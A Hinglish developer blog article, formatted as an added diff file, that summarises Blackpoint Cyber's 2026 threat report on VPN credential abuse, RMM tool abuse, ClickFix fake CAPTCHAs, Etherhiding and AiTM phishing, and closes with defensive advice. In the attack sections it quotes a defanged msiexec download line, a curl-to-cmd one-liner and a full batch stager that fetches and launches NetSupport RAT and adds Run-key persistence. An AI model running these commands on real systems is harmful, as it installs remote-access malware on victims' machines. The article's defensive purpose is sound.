@@ -1,0 +1,412 @@
+# Attacker Ne Todha Nahi — Seedha Login Kar Liya
+## Blackpoint Cyber 2026 Annual Threat Report — Ek Developer Ki Nazar Se
+
+---
+
+*"Ek valid username. Ek sahi password. Aur woh tool jo tumhari team roz use karti hai. 2025 mein yahi cheezein attacker ka welcome mat ban gayi."*
+— Gagan Singh, CEO, Blackpoint Cyber
+
+---
+
+Ek second ke liye imagine karo.
+
+Tumne mahino laga diye apni infrastructure harden karne mein. Firewall rules, rate limiting, WAF policies, har jagah MFA. Tumhe achha lag raha hai. Tumhe *secure* feel ho raha hai. Phir ek Tuesday dopahar ko — ek attacker seedha tumhare front door se andar aa jaata hai.
+
+Firewall fail nahi hua. MFA bypass nahi hua. Koi zero-day use nahi hua.
+
+Bas ek valid VPN credential tha. Ek RMM tool install kiya jo tumhari IT team already use karti hai. Aur woh bilkul ek normal employee ki tarah dikh raha tha, normal kaam karte hue.
+
+Yeh koi hypothetical nahi hai. **Yahi 2025 tha.**
+
+---
+
+## Pehle Jaano: Yeh Report Hai Kya, Aur Kisne Publish Ki?
+
+**Blackpoint Cyber** ek US-based cybersecurity company hai jo **24/7 human-led Security Operations Center (SOC)** operate karti hai. Yeh mainly **Managed Service Providers (MSPs)** ko serve karti hai — matlab woh companies jo doosri companies ka IT manage karti hain.
+
+Unka kaam hai har waqt real environments mein hone wale attacks ko detect karna aur rokna. Automated tools se nahi — trained humans se jo context samjhte hain, sirf alerts nahi padhte.
+
+Har saal woh apna **Annual Threat Report** publish karte hain — jo unke SOC ne us puri saal mein handle kiye real incidents ke data pe based hota hai. Koi academic research nahi. Koi synthetic data nahi. Real intrusions, real kill chains, real case studies.
+
+**Yeh hai 2026 Annual Threat Report** — covering January 2025 to December 2025.
+
+> 📄 **Source:** *Blackpoint Cyber 2026 Annual Threat Report* — published by Blackpoint Cyber (blackpointcyber.com). Full PDF **MonkeyPatching GitHub repository** pe available hai — link article ke end mein hai. Jao, original padho, worth it hai.
+
+---
+
+## Central Idea: Sophistication Overrated Hai — Attackers Ke Liye
+
+Report ka opening line hi sab kuch keh deta hai:
+
+> *"Attackers no longer need to break in if they can simply log in."*
+
+Zero-day exploits expensive hote hain develop karne mein. Custom malware detectable hoti hai. Kisi user ko phish karke ek legitimate remote access tool install karwana? Almost free. Aur kaam karta hai.
+
+Blackpoint SOC ne thousands of incidents mein ek clear pattern observe kiya — adversaries ne custom hacking tools abandon kiye aur woh tools use karne lage jo organizations khud already trust karti hain. VPNs, RMM software, software installers, browser prompts — sab weaponize ho gaye. Tode nahi. **Repurpose kiye gaye.**
+
+Report isko kehti hai **"Trusted Compromise"** — aur yahi theme har case study mein repeat hoti hai.
+
+---
+
+## Numbers Se Shuru Karte Hain
+
+Tactics mein jaane se pehle, data dekho:
+
+|                       Metric                      |           Number         |
+|---------------------------------------------------|--------------------------|
+| 2025 mein CVEs disclosed                          | **45,000+**              |
+| Incidents payload deploy hone se pehle rokay gaye | **56%**                  |
+| RMM abuse — EDR se pehle SOC ne detect kiya       | **72%** of the time      |
+| SSL VPN incidents jo pre-ransomware the           | **60%+**                 |
+| Fake CAPTCHA / ClickFix — sabse bada campaign     | **58%** of all incidents |
+
+Woh **56%** wala number ruko aur dobara padho.
+
+Iska matlab hai — har 100 intrusion attempts mein se 56 ko SOC ne payload deploy hone se *pehle* hi rok diya. Yeh koi known signature catch nahi ki automated system ne. Yeh humans the jo behavior aur context dekh rahe the.
+
+---
+
+## Attack Vector #1: SSL VPN — Front Door Problem
+
+### Kya hua
+
+SSL VPN compromise 2025 ka sabse consistently abused initial access vector tha. Reason simple hai — VPN gateways ko internet-facing hona hi padta hai apna kaam karne ke liye. Woh edge pe baithte hain. Ek baar attacker andar aa gaya, toh woh effectively tumhare corporate network ke andar hai with full trust.
+
+Do primary raste observe kiye gaye:
+
+1. **Vulnerability exploit** — VPN appliance ko directly target karna
+2. **Credential abuse** — stolen ya brute-forced valid credentials use karna
+
+Doosra wala zyada common aur zyada dangerous hai, kyunki valid credential koi alarm nahi trigger karta. Attacker bilkul ek remote employee jaisa dikhta hai jo ghar se kaam kar raha hai.
+
+### SonicWall: 59% of SSL VPN incidents
+
+SonicWall devices sabse zyada targeted the — 59% VPN incidents mein. Reason samajh aata hai jab CVE table dekhte hain:
+
+|       CVE      | CVSS Score |           Type       |
+|----------------|------------|----------------------|
+| CVE-2025-23006 | **9.8** 🔴 | Deserialization      |
+| CVE-2025-40602 | 6.6 🟡     | Privilege Escalation |
+
+Yeh dono wild mein **chain** kiye gaye. CVE-2025-23006 se RCE milti hai, CVE-2025-40602 se admin access. Alag alag dekho toh ek medium, ek critical. Saath mein dekho — **full system compromise**.
+
+Yahan ek important lesson hai developer ke liye:
+
+> **Individual CVEs ko patch karna enough nahi hai. Attack paths sochne padenge, individual vulnerabilities nahi.**
+
+### VPN entry ke baad kya hota hai
+
+Blackpoint case study mein precise details hain. FortiGate SSL VPN mein compromised credentials se authenticate karne ke baad (assigned IP: `10.0.0.4`), threat actor ne:
+
+1. Kisi workstation pe foothold establish karne ki koshish nahi ki
+2. Directly **domain controller** pe remote execution ke liye pivot kiya
+3. **WMI** (`wmiexec`) use kiya remote command execution ke liye — yeh legitimate admin tool hai, completely expected traffic
+4. Domain controller pe **Volume Shadow Copies** banaye — classic pre-ransomware staging step
+
+Puri tool chain jo observe ki gayi:
+
+```
+Initial Access  →  Persistence      →  Lateral Movement  →  Exfiltration
+SonicWall          ScreenConnect        Impacket              Rclone
+Exploit            AnyDesk              CrackMapExec          RSync
+                   TeamViewer           wmiexec
+                   Splashtop            Server Manager
+```
+
+### Developer Angle
+
+Socho — VPN access tumhari API ke authentication layer jaisa hai. Tumne caller ko authenticate kar liya. Lekin authenticate hone ke baad woh kya access kar sakta hai, yeh scope kiya kya?
+
+Zyada tar VPN deployments mein users ek flat, broadly routable internal segment mein land karte hain. Koi network-level ACL nahi hai jo kahe "yeh VPN user sirf app server tak pahunch sakta hai, domain controller tak nahi."
+
+Yeh bilkul waise hai jaise ek REST API likhna jahan har authenticated user ko default mein admin scope mil jaaye. Apni API mein yeh nahi karoge. Network mein bhi mat karo.
+
+---
+
+## Attack Vector #2: RMM Abuse — Backdoor Hidden in Plain Sight
+
+### RMM kya hota hai
+
+Remote Monitoring and Management tools woh software hai jo MSPs use karte hain client machines ko remotely manage karne ke liye. ScreenConnect, AnyDesk, TeamViewer, GoToAssist — yeh sab legitimate tools hain legitimate uses ke saath.
+
+Yeh perfect Command and Control infrastructure bhi hain:
+- Built-in remote access aur shell execution
+- Signed binaries — antivirus ko trigger nahi karte
+- Corporate networks pe common hain — perfectly blend karte hain
+- Operate karna easy hai — custom malware ki zaroorat nahi
+
+**2025 mein 30.3% identifiable incidents mein RMM abuse tha.**
+
+### "Backdoor Your Backdoor" Campaign
+
+Yeh woh technique hai jisne mujhe genuinely impress kiya. Blackpoint ne ek campaign pattern document kiya:
+
+**Step 1:** Phishing email aata hai — Social Security Statement, tax document, ya invoice ke disguise mein. User click karta hai, attachment run karta hai. Yeh binary **FleetDeck** install kar deti hai (ek RMM tool).
+
+**Step 2:** FleetDeck install hone ke baad attacker ke infrastructure se connect hota hai aur silently ek remote msiexec command execute karta hai:
+
+```
+msiexec /i hxxp://server[.]bnotuyiyed[.]online/ScreenConnect.ClientSetup.msi
+```
+
+**Step 3:** Ab ScreenConnect bhi install hai. **Do footholds. Ek nahi.**
+
+**Kyun do?** Kyunki defenders probably FleetDeck find karke remove kar denge. Lekin ScreenConnect itna common hai MSP environments mein ki duplicate install easily dismiss ho jaata hai as legitimate IT tool. Radar ke neeche reh jaata hai.
+
+### Numbers jo real story batate hain
+
+ScreenConnect **71.5%** rogue RMM incidents mein tha:
+
+```
+ScreenConnect  ███████████████████████████  71.5%
+AnyDesk        ████                          9.6%
+GoTo Resolve   ███                           8.1%
+GoToAssist     ███                           7.3%
+TeamViewer     ██                            4.6%
+```
+
+Aur EDR failure rate: **72% of the time, Blackpoint SOC ne detect aur respond kar liya traditional EDR agents ke alert karne se pehle.**
+
+Agar tumhara poora security plan EDR pe based hai — tum yeh 72% of the time miss kar rahe ho.
+
+---
+
+## Attack Vector #3: Fake CAPTCHA / ClickFix — 58% of All Incidents
+
+Yeh 2025 ka single highest-volume attack campaign tha. Aur yeh kaam karta hai kyunki yeh kuch aise exploit karta hai jo koi firewall block nahi kar sakta: **human habit**.
+
+### Mechanism
+
+Har kisi ne CAPTCHA click kiya hai. Yeh muscle memory hai. Attackers ne exactly usi reflex ke around ek attack build kiya.
+
+**Flow kuch aisa hai:**
+
+1. User ek legitimate website visit karta hai (usually ek compromised WordPress site)
+2. Ek fake Cloudflare verification prompt appear hota hai
+3. Page instruction deta hai: *"Win+R press karo, phir Ctrl+V — verify karo ki tum robot nahi ho"*
+4. User comply karta hai — aur ek malicious PowerShell command run ho jaata hai jo clipboard mein pre-loaded tha
+5. Payload silently deploy ho jaata hai
+
+Windows Run dialog (`Win+R`) woh sab kuch execute kar sakta hai jiske liye current user ke paas permission hai — cmd, PowerShell, mshta, wscript. Yeh koi vulnerability nahi hai. Yeh ek **feature** hai. Aur use social engineering bridge ki tarah use kiya ja raha hai.
+
+### Etherhiding: Blockchain Pe C2
+
+Yahan 2025 technically interesting ho jaata hai.
+
+Traditionally, attackers compromised websites pe malicious JavaScript host karte hain. Jab C2 server down hoti hai ya domain blocklist mein aata hai, campaign khatam. Toh attackers ne infrastructure problem blockchain se solve ki.
+
+**Etherhiding kaise kaam karta hai:**
+
+1. Attacker **Binance Smart Chain (BSC)** pe ek smart contract deploy karta hai
+2. Compromised WordPress sites mein JavaScript inject hoti hai jo us contract ko `JSON-RPC eth_call` karti hai
+3. Contract base64-encoded JavaScript return karta hai — actual malicious payload
+4. Smart contract **takedown nahi ho sakta** — blockchain pe deploy hone ke baad immutable hai
+
+Har infected site ka payload simultaneously change karna ho? Ek smart contract update karo. Thousands of compromised servers ko touch karne ki zaroorat nahi. Koi naya domain register karne ki zaroorat nahi.
+
+Software architecture perspective se dekho toh — **yeh genuinely clever hai**. Decentralization as a resilience mechanism — except financial transactions ke liye nahi, malware delivery ke liye.
+
+### NetSupport RAT — Actual Code
+
+Ek incident mein yeh execution path kitna clean tha, dekho:
+
+```bash
+# Win+R dialog se ek curl command:
+curl -s https://[attacker-domain]/stage.bat | cmd
+```
+
+```batch
+@echo off
+setlocal enabledelayedexpansion
+
+:: Variables set karo
+set URL=https://[attacker-domain]/client.zip
+set DEST=%APPDATA%\Support\
+
+:: Directory banao
+mkdir %DEST%
+
+:: PowerShell se ZIP download karo (hidden window)
+powershell -WindowStyle Hidden -Command ^
+  "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%client.zip'"
+
+:: .NET ZipFile class se extract karo
+powershell -Command ^
+  "Add-Type -Assembly System.IO.Compression.FileSystem; ^
+   [IO.Compression.ZipFile]::ExtractToDirectory('%DEST%client.zip','%DEST%')"
+
+:: NetSupport RAT launch karo
+start "" "%DEST%client32.exe"
+
+:: Registry Run key se persistence banao
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
+  /v "Support11" /t REG_SZ /d "%DEST%client32.exe" /f
+```
+
+Developer ke liye teen observations:
+
+1. **`%APPDATA%` se execution** — user-writable location, admin elevation nahi chahiye
+2. **`.NET ZipFile` class** — legitimate Windows framework, external tool nahi
+3. **`HKCU\...\Run` registry key** — admin rights nahi chahiye persistence ke liye
+
+Yeh poora **Living-off-the-Land (LotL)** hai. Koi custom binary nahi. Har tool — `curl`, `powershell`, `reg`, `cmd` — Windows ke saath ship hota hai.
+
+---
+
+## Attack Vector #4: AiTM Phishing — MFA Kaam Karta Hai. Yehi Problem Hai.
+
+### Session Token Attack
+
+Adversary-in-the-Middle (AiTM) phishing is report ka sabse philosophically interesting attack hai — kyunki yeh kaam karta hai **isliye** kyunki MFA sahi se kaam karta hai.
+
+Traditional phishing credentials churaata hai. AiTM kuch zyada valuable churaata hai — **authenticated session token** jo MFA complete hone ke *baad* issue hota hai.
+
+**Mechanism:**
+
+```
+User → Phishing Link → Attacker Proxy → Microsoft (real)
+                              ↓
+                     Session Cookie Capture
+                              ↓
+                     Attacker ke paas valid session
+```
+
+1. User phishing email pe click karta hai
+2. Link attacker-controlled proxy pe jaata hai (Azure Function ke andar build — legitimate Azure traffic mein blend karne ke liye)
+3. User credentials enter karta hai → proxy Microsoft ko relay karta hai → MFA complete hoti hai
+4. Microsoft session cookie issue karta hai → proxy use capture kar leta hai
+5. Attacker ke paas ab valid authenticated session hai — **bina password ke, bina MFA ke**
+
+Session ko replay kiya ja sakta hai M365, Teams, SharePoint access karne ke liye — jab tak session expire na ho.
+
+### Azure Function Angle
+
+Phishing proxy ko Azure Functions ke andar host karna noteworthy hai:
+- TLS certificates valid hain (*.azurewebsites.net trusted hai)
+- Traffic legitimate Azure cloud traffic ke saath blend hoti hai
+- Koi suspicious domain nahi blocklist ke liye
+- Low cost, high scalability
+
+Yeh developer-level cloud infrastructure understanding hai, cloud infrastructure ke against weaponize ki gayi.
+
+Ek observed incident mein: session capture ke baad attacker ne Azure AD mein legitimate **eM Client** application consent kiya (persistent mailbox access ke liye) aur phir poori address book harvest ki future phishing ke liye. **Ek compromised account → persistent access → expanded attack surface.**
+
+---
+
+## Vulnerability Landscape: Tumhara Code Is Mein Kahan Hai
+
+45,000+ CVEs 2025 mein. Top CWE categories jo attacker-prioritized vulnerabilities drive karti hain:
+
+|                   CWE             | % of Notifications |               Developer Translation              |
+|-----------------------------------|--------------------|--------------------------------------------------|
+| Deserialization of Untrusted Data |        7.3%        | User-controlled input kabhi deserialize mat karo |
+| Path Traversal                    |        7.3%        | User-provided file paths pe kabhi trust mat karo |
+| Use After Free                    |        6.8%        | Memory safety (mostly C/C++)                     |
+| Authentication Bypass             |        5.3%        |  Server-side auth checks — always                |
+| Improper Privilege Management     |        4.9%        | Principle of least privilege                     |
+
+Top five mein se teen **application-level vulnerabilities** hain — woh jo developers code mein introduce karte hain. Network misconfiguration nahi. Outdated hardware nahi. **Code.**
+
+### CVE Chaining: The Real Problem
+
+Report ka sabse important vulnerability insight:
+
+> *"Individual CVEs ko alag alag patch karna modern attack chains ke against sufficient nahi raha."*
+
+**Gladinet CentreStack example:**
+
+- CVE-2025-11371 (LFI, CVSS 6.1) → authenticated file reads possible → machine keys leak ho sakti hain
+- CVE-2025-14611 (Hardcoded crypto keys, CVSS 7.1) → stolen machine keys se ViewState forge karo → RCE
+
+Dono medium-severity CVEs. Individually? Limited impact. **Chain karo? Full server compromise.**
+
+Developer lesson: **System level pe threat model karo, individual function level pe nahi.** Endpoint A mein information disclosure + Endpoint B mein logic flaw = real attack path.
+
+---
+
+## Sabse Zyada Targeted Industries
+
+```
+Manufacturing          ████████████  11.5%
+Healthcare             ███████████   10.3%
+MSPs                   █████████      8.4%
+Construction & Eng.    █████████      8.4%
+Financials             ████████       8.2%
+```
+
+**Manufacturing** top pe kyun? Outdated OT systems, flat networks, aur ek manufacturer ke offline hone ka downstream pressure — supply chain disruption customers, distributors, aur partners tak cascade karta hai. Attacker ka leverage enormous hai. Ransom payment probability dramatically increase ho jaati hai.
+
+**MSPs** ka interesting case hai — attackers inhe end target nahi mante, **force multiplier** mante hain. Ek MSP technician ka account compromise karo ya ek RMM instance, aur quietly dozens ya hundreds of downstream client environments ka access unlock ho jaata hai.
+
+---
+
+## Defenders Ko Kya Karna Chahiye: Priority Order Mein
+
+Report ki recommendations, developer lens se filter karke:
+
+### Abhi Karo (Aaj)
+
+- **VPNs pe MFA universally enforce karo** — koi exception nahi, koi legacy fallback nahi
+- **VPN address pools strictly segment karo** — remote sessions domain controllers, backup servers, ya RMM infrastructure tak directly nahi pahunchni chahiye
+
+### Is Hafte Karo
+
+- **`%APPDATA%`, `%TEMP%`, aur `Downloads` se execution block karo** — report ke almost every installer-based attack ka payload staging location yahi tha
+- **Uncommon TLDs block karo** — `.online`, `.top`, `.live` disproportionately RMM C2 infrastructure mein use hote hain
+- **Outbound Web3 RPC endpoints block karo** (Binance Smart Chain JSON-RPC) — yeh directly Etherhiding delivery break karta hai
+
+### Is Quarter Mein Karo
+
+- **Phishing-resistant MFA (FIDO2 / WebAuthn) pe migrate karo** — regular TOTP AiTM nahi rokta. Hardware keys ya passkeys rokti hain
+- **Standard users ke liye `Win+R` GPO se disable karo** — ClickFix execution bridge remove ho jaata hai
+- **Immutable backups with off-network replication implement karo** — ransomware ka final leverage disappear ho jaata hai jab tum bina payment ke recover kar sako
+
+---
+
+## Woh Insight Jo Koi Nahi Baat Karta
+
+Report ke statistics mein ek cheez buried hai jo zyada attention deserve karti hai:
+
+**56% of all incidents were disrupted before a payload was deployed.**
+
+Yeh EDR nahi tha ek known malware signature catch karte hue. Yeh humans the jo behavioral context dekh rahe the:
+
+- VPN session unusual subnet se domain controller hit kar raha hai authentication ke seconds baad
+- ScreenConnect install kar raha hai `msiexec` spawn karke doosra RMM installer fetch karne ke liye
+- User Run dialog se curl command run kar raha hai
+
+Yeh behaviors individually malicious nahi hain. Yeh contextually suspicious hain jab tum baseline jaante ho.
+
+**Attacker paradox:** Zero-days aur exotic exploits abandon karke trusted tooling mein shift karke, attackers ne khud ko actually zyada detectable banaya, kam nahi. Jitna zyada woh normal behavior mein blend hote hain, utna important ho jaata hai ki defenders ko *pata ho* normal behavior kaisi dikhti hai.
+
+Agar 2025 woh saal tha jab attackers ne trust weaponize kiya — toh 2026 woh saal hona chahiye jab defenders context awareness build karein.
+
+---
+
+## Closing Thought: Tumhara Code Is Mein Part Hai
+
+Ek baat jo developers kam sunte hain:
+
+Top five CWE categories mein se teen — deserialization, path traversal, authentication bypass — woh cheezein hain jo **tumhare likhe code mein hoti hain**. Network hardware mein nahi jo tum configure karte ho. Security team ki policies mein nahi. Us function mein jo tumne last Tuesday likha tha.
+
+2025 mein 45,000 CVEs sirf legacy hardware se nahi aaye. Bahut saare applications se aaye. APIs. Web apps. File processing services. Woh cheezein jo developers ne build kiyaan.
+
+Security building khatam karne ke baad nahi hoti. Yeh ek constraint hai jiske around tum design karte ho — same way jaise performance ya scalability ke around karte ho. Yeh report ek window hai us cheez mein jo hota hai jab yeh nahi hota.
+
+---
+
+## References
+
+- **Blackpoint Cyber 2026 Annual Threat Report** — Blackpoint Cyber (blackpointcyber.com)
+- Full PDF **[MonkeyPatching GitHub Repository](https://github.com/learnwithworkshop)** pe available hai — original padho, case studies worth your time hain
+- MITRE ATT&CK Framework — TTP mapping context ke liye (attack.mitre.org)
+- MITRE CWE Database — vulnerability category definitions ke liye (cwe.mitre.org)
+
+---
+
+*Yeh article ek developer ne likha hai jo threat reports padhta hai taaki tumhe padhne ki zaroorat na pade — aur phir unke baare mein likhta hai taaki tum padho.*
+
+*security research breakdowns, developer-focused threat intelligence, aur woh technical content jo actually matter karta hai jab tum real systems build kar rahe ho.*
+
+---
+
